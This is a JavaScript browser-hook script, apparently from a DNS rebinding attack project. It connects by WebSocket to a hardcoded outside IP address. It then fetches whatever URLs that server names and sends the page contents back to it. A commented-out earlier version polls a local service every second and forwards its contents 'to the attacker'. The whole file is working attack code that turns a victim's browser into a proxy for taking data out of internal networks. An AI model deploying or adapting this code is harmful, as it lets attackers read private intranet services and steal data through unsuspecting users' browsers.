
// Where to open the web socket
//
const url = 'ws://138.195.242.173:4242'

let connection = new WebSocket(url)

connection.onopen = () => {

    console.log("Browser Hooked")

    connection.onmessage = (message) => {

        console.log("received message: " , message)

        try
        {
            message = JSON.parse(message.data)

            if (message.type == 'redirect')
            {
                fetch(message.url, {credentials: 'omit'})
                        .then( (res) => res.text() )
                        .then( (html) => {


                                    var redirect_request = {}
                                    redirect_request.type = "redirect";
                                    redirect_request.url = message.url;
                                    redirect_request.index = message.index;
                                    redirect_request.html = html;
                                    console.log("sending: ", redirect_request)

                                    return JSON.stringify(redirect_request);
                                }
                             )
                        .then( (redirect_answer) => connection.send(redirect_answer))
            }
        }
        catch (err)
        {
            console.error("WebSocket onmessage error: " , err)
        }

     }
}

/*

// Fetchin local data every second
// This script was the first we use to test and try the DNS Rebinding attack

function malicious()
{

    fetch("http://mechant.mechant:3000", {credentials: 'omit'}).then( (res) => res.text()).then( (html) => {

        console.log("Fetched: ", html)

        }).catch((err) =>{
                    console.log("Could not fetch: ", err)
                }
        );

        // Sending what has been fetched to the attacker
        connection.send(html);

        setTimeout(malicious, 1000);
}




malicious()

*/
